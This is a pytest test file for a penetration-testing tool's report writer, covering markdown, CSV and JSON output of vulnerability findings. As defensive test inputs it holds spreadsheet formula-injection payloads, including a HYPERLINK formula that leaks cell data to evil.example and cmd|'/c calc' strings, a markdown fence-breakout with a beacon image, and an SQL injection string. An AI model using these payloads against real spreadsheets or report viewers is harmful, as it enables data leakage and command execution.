"""Tests for strix.report.writer artifact helpers."""

from __future__ import annotations

import csv
import json
from typing import TYPE_CHECKING, Any

import pytest

from strix.report.writer import (
    atomic_write_text,
    read_run_record,
    render_vulnerability_md,
    write_executive_report,
    write_run_record,
    write_vulnerabilities,
)


if TYPE_CHECKING:
    from pathlib import Path


def _sample_report(**overrides: Any) -> dict[str, Any]:
    base: dict[str, Any] = {
        "id": "vuln-0001",
        "title": "SQL Injection",
        "severity": "high",
        "timestamp": "2026-07-02 10:00:00 UTC",
        "description": "User input reaches SQL query unsanitized.",
        "impact": "Database read access.",
        "target": "https://app.example.com",
        "endpoint": "/api/login",
        "method": "POST",
    }
    base.update(overrides)
    return base


def test_read_run_record_missing_returns_empty(tmp_path: Path) -> None:
    assert read_run_record(tmp_path) == {}


def test_read_run_record_corrupt_raises(tmp_path: Path) -> None:
    record = tmp_path / "run.json"
    record.write_text("{not json", encoding="utf-8")
    with pytest.raises(RuntimeError, match="unreadable"):
        read_run_record(tmp_path)


def test_read_run_record_non_object_raises(tmp_path: Path) -> None:
    record = tmp_path / "run.json"
    record.write_text(json.dumps(["array"]), encoding="utf-8")
    with pytest.raises(TypeError, match="not an object"):
        read_run_record(tmp_path)


def test_write_and_read_run_record_round_trip(tmp_path: Path) -> None:
    payload = {"scan_id": "scan-abc", "status": "completed"}
    write_run_record(tmp_path, payload)
    assert read_run_record(tmp_path) == payload


def test_render_vulnerability_md_includes_core_sections() -> None:
    md = render_vulnerability_md(
        _sample_report(
            technical_analysis="Root cause in UserDAO.",
            poc_description="Send ' OR 1=1 --",
            remediation_steps="Use parameterized queries.",
        ),
    )
    assert "# SQL Injection" in md
    assert "**Severity:** HIGH" in md
    assert "## Description" in md
    assert "## Impact" in md
    assert "## Technical Analysis" in md
    assert "## Proof of Concept" in md
    assert "## Remediation" in md
    assert "**Endpoint:** /api/login" in md


def test_render_vulnerability_md_includes_dependency_fields() -> None:
    md = render_vulnerability_md(
        _sample_report(
            title="CVE-2021-23337 in lodash 4.17.20",
            severity="high",
            target="repo/package.json",
            endpoint=None,
            method=None,
            cve="CVE-2021-23337",
            cwe="CWE-94",
            cvss=7.2,
            fix_effort="trivial",
            finding_class="dependency_cve",
            evidence="**Advisory evidence:** `CVE-2021-23337` applies to `lodash`.",
            assumptions="Assumes lodash ships in deployed builds.",
            dependency_metadata={
                "package_name": "lodash",
                "package_ecosystem": "npm",
                "installed_version": "4.17.20",
                "fixed_version": "4.17.21",
            },
            remediation_steps="Upgrade to 4.17.21.",
        ),
    )
    assert "**Package:** lodash" in md
    assert "**Ecosystem:** npm" in md
    assert "**Installed Version:** 4.17.20" in md
    assert "**Fixed Version:** 4.17.21" in md
    assert "**CWE:** CWE-94" in md
    assert "**Fix Effort:** Trivial" in md
    assert "## Evidence" in md
    assert "## Assumptions" in md


def test_render_vulnerability_md_poc_code_cannot_break_out_of_fence() -> None:
    # LLM/target-authored PoC content containing its own ``` must not close the
    # fence early and turn the injected markdown into live headings/images.
    injected = "curl x\n```\n\n## Injected Heading\n![x](https://evil.example/beacon.png)"
    md = render_vulnerability_md(_sample_report(poc_script_code=injected))
    lines = md.split("\n")
    opening = next(ln for ln in lines[lines.index("## Proof of Concept") + 1 :] if ln.strip())
    ticks = opening[: len(opening) - len(opening.lstrip("`"))]
    assert len(ticks) >= 4  # wider than the payload's 3-backtick run
    assert "`" not in opening.removeprefix(ticks)  # backtick run + language tag only
    assert f"\n{ticks}\n" in md  # pure-backtick closing fence of the same width
    assert injected in md  # the payload survives verbatim, inside the fence


def test_render_vulnerability_md_snippet_cannot_break_out_of_fence() -> None:
    snippet = "row = q()\n```\n## Injected"
    md = render_vulnerability_md(
        _sample_report(code_locations=[{"file": "app.py", "snippet": snippet}]),
    )
    assert (
        "  ````\n  row = q()\n  ```\n  ## Injected\n  ````"
    ) in md  # indented fence widened past the payload's ``` run


def test_write_vulnerabilities_creates_markdown_csv_and_json(tmp_path: Path) -> None:
    reports = [
        _sample_report(id="vuln-0001", severity="medium", timestamp="2026-07-02 11:00:00 UTC"),
        _sample_report(
            id="vuln-0002",
            title="Critical RCE",
            severity="critical",
            timestamp="2026-07-02 09:00:00 UTC",
        ),
    ]
    saved: set[str] = set()

    new_count = write_vulnerabilities(tmp_path, reports, saved)

    assert new_count == 2
    assert (tmp_path / "vulnerabilities" / "vuln-0001.md").exists()
    assert (tmp_path / "vulnerabilities" / "vuln-0002.md").exists()
    assert json.loads((tmp_path / "vulnerabilities.json").read_text(encoding="utf-8")) == reports

    csv_rows = list(
        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
    )
    assert [row["id"] for row in csv_rows] == ["vuln-0002", "vuln-0001"]
    assert csv_rows[0]["severity"] == "CRITICAL"


@pytest.mark.parametrize(
    "payload",
    [
        '=HYPERLINK("http://evil.example/leak?d="&A1,"View")',
        "+cmd|'/c calc'!A1",
        "@SUM(1+1)*cmd|'/c calc'!A1",
        "-2+3+cmd|'/c calc'!A1",
        "\t leading tab",
        "\r leading carriage return",
    ],
)
def test_write_vulnerabilities_csv_neutralizes_formula_injection(
    tmp_path: Path,
    payload: str,
) -> None:
    # Titles quote text from the scanned target, so a finding title can begin with
    # a spreadsheet formula trigger. csv escapes CSV syntax but not formula
    # triggers, so the cell has to be neutralized before it is written.
    write_vulnerabilities(tmp_path, [_sample_report(title=payload)], set())

    csv_rows = list(
        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
    )
    title = csv_rows[0]["title"]
    assert title.startswith("'")
    assert not title.startswith(("=", "+", "-", "@", "\t", "\r"))


def test_write_vulnerabilities_csv_preserves_payload_after_guard(tmp_path: Path) -> None:
    payload = "=1+1"
    write_vulnerabilities(tmp_path, [_sample_report(title=payload)], set())

    csv_rows = list(
        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
    )
    assert csv_rows[0]["title"] == "'=1+1"  # guard prefix only, payload intact


def test_write_vulnerabilities_csv_leaves_benign_titles_unchanged(tmp_path: Path) -> None:
    write_vulnerabilities(tmp_path, [_sample_report(title="SQL Injection in /login")], set())

    csv_rows = list(
        csv.DictReader((tmp_path / "vulnerabilities.csv").read_text(encoding="utf-8").splitlines()),
    )
    assert csv_rows[0]["title"] == "SQL Injection in /login"


def test_atomic_write_text_keeps_payload_byte_for_byte(tmp_path: Path) -> None:
    # The CSV index carries its own \r\n terminators, so newline translation would
    # turn every row ending into \r\r\n on Windows.
    payload = "a,b\r\nc,d\r\n"
    path = tmp_path / "index.csv"

    atomic_write_text(path, payload)

    assert path.read_bytes() == payload.encode("utf-8")


def test_write_vulnerabilities_skips_already_saved_ids(tmp_path: Path) -> None:
    reports = [_sample_report(id="vuln-0001")]
    saved: set[str] = {"vuln-0001"}

    new_count = write_vulnerabilities(tmp_path, reports, saved)

    assert new_count == 0
    assert not (tmp_path / "vulnerabilities" / "vuln-0001.md").exists()
    assert (tmp_path / "vulnerabilities.csv").exists()


def test_write_executive_report_writes_markdown(tmp_path: Path) -> None:
    write_executive_report(tmp_path, "Scan complete. No critical issues.")
    content = (tmp_path / "penetration_test_report.md").read_text(encoding="utf-8")
    assert "# Security Penetration Test Report" in content
    assert "Scan complete. No critical issues." in content


def test_render_vulnerability_md_surfaces_calibration_metadata() -> None:
    """Confidence, the case against the finding, and retest status are part of
    the deliverable — storing them without rendering hides the reasoning."""
    md = render_vulnerability_md(
        {
            "id": "vuln-0009",
            "title": "SSRF in URL preview",
            "severity": "high",
            "timestamp": "2026-07-02 10:00:00 UTC",
            "description": "Fetches user-supplied URLs.",
            "confidence": "medium",
            "counterevidence": "Egress appears filtered at the network layer.",
            "confidence_rationale": "Reproduced once out of three attempts.",
            "severity_change_conditions": "Critical if egress filtering is removed.",
            "remediation_steps": "Allowlist destinations.",
            "fix_verification": "Not retested.",
        }
    )

    assert "**Confidence:** Medium" in md
    assert "## Counterevidence" in md
    assert "Egress appears filtered at the network layer." in md
    assert "## Confidence Rationale" in md
    assert "## What Would Change This Severity" in md
    assert "## Fix Verification" in md


def _intent_report(**overrides: Any) -> dict[str, Any]:
    """A source-aware finding carrying the full developer-intent block."""
    base = _sample_report(
        intent_check_status="completed",
        intent_search_scope=[
            "doc/development/permissions (grep for import boundary)",
            "spec/requests/api/imports_spec.rb",
            "git log -S import_source_user",
        ],
        intent_evidence=[
            {
                "source": (
                    "doc/development/permissions/granular_access/rest_api_implementation_guide.md"
                ),
                "authority": "implementation_spec",
                "supports": "import endpoints may resolve a group or a user boundary",
                "contradicts": "",
                "stale": False,
                "note": "lines 181-199",
            },
            {
                "source": "CHANGELOG.md",
                "authority": "history",
                "supports": "",
                "contradicts": "the route was tightened to project owners",
                "stale": True,
                "note": "",
            },
        ],
        known_issue_or_duplicate_search=(
            "Searched CHANGELOG and the issue tracker for PAT scope handling on imports; no entry."
        ),
        alternative_semantics_check=(
            "Access is granted when any one resolved boundary is satisfied, so the user "
            "boundary is a satisfied alternative rather than a bypass."
        ),
        security_contract_conflict={
            "kind": "conflicting_security_invariant",
            "invariant": (
                "A fine-grained PAT scoped to a user must never reach a group the token was not "
                "scoped to."
            ),
            "source": "SECURITY.md (fine-grained token promises)",
            "impact": "A user-scoped token reads and writes every project under the target group.",
        },
        intent_review={
            "reviewer_kind": "independent_agent",
            "reviewed_by": "reviewer-agent-2",
            "verdict": "intent_confirmed",
            "notes": "Re-read the guide and both route files; the OR semantics are explicit.",
        },
        intent_gate={
            "applies": True,
            "disposition": "report_conflict",
            "reasons": [],
            "warnings": ["Only non-authoritative evidence supports the remaining claim."],
            "evidence_count": 2,
            "authoritative_support": [
                "doc/development/permissions/granular_access/rest_api_implementation_guide.md",
            ],
            "authoritative_contradict": [],
            "weak_support": [],
            "stale": ["CHANGELOG.md"],
        },
    )
    base.update(overrides)
    return base


def test_render_vulnerability_md_surfaces_the_intent_block() -> None:
    """A triager must be able to see the disposition and which sources decided it
    without opening vulnerabilities.json."""
    md = render_vulnerability_md(_intent_report())

    assert "## Intent & known-issue check" in md
    assert "**Status:** completed · **Disposition:** report_conflict" in md
    # Evidence: source + authority + the claim, with stale entries marked.
    assert (
        "- doc/development/permissions/granular_access/rest_api_implementation_guide.md "
        "(implementation_spec) — supports: import endpoints may resolve a group or a user boundary "
        "— note: lines 181-199"
    ) in md
    assert (
        "- CHANGELOG.md (history) — contradicts: the route was tightened to project owners "
        "**(STALE)**"
    ) in md
    assert (
        "**Search scope:** doc/development/permissions (grep for import boundary); "
        "spec/requests/api/imports_spec.rb; git log -S import_source_user"
    ) in md
    assert "**Known-issue search:** Searched CHANGELOG and the issue tracker" in md
    assert (
        "**Alternative semantics:** Access is granted when any one resolved boundary is satisfied"
    ) in md
    assert (
        "**Conflict:** `conflicting_security_invariant` — A fine-grained PAT scoped to a user"
    ) in md
    assert "**Conflict source:** SECURITY.md (fine-grained token promises)" in md
    assert "**Conflict impact:** A user-scoped token reads and writes every project" in md
    assert "**Review:** intent_confirmed by reviewer-agent-2 (independent_agent)" in md
    assert "**Warnings:**" in md


def _section_blocks(md: str) -> list[str]:
    """Split a rendered report into its ``## `` sections (headings included)."""
    return ["## " + part for part in md.split("## ")[1:]]


def test_render_vulnerability_md_omits_the_intent_section_without_metadata() -> None:
    """Finding files written before the gate existed must render exactly as before."""
    plain = render_vulnerability_md(_sample_report())
    with_intent = render_vulnerability_md(_intent_report())

    assert "Intent & known-issue check" not in plain
    assert "**Disposition:**" not in plain
    # The intent-bearing render is the plain one plus exactly that one section:
    # the header/description block and every other section are byte-identical.
    assert plain.split("## ")[0] == with_intent.split("## ")[0]
    assert _section_blocks(plain) == [
        block
        for block in _section_blocks(with_intent)
        if not block.startswith("## Intent & known-issue check")
    ]


def test_render_vulnerability_md_survives_partial_intent_metadata() -> None:
    # A partially filled block (older agent, or a search that could not run) still
    # renders, naming what is missing instead of raising.
    md = render_vulnerability_md(
        _sample_report(
            intent_check_status="unavailable",
            intent_evidence=[{"source": "docs/security-model.md"}],
        ),
    )

    assert "**Status:** unavailable · **Disposition:** not_recorded" in md
    assert "- docs/security-model.md (authority not recorded) — no claim recorded" in md
    assert "**Evidence:**" in md
    assert "**Review:**" not in md  # absent review renders nothing, not a blank row
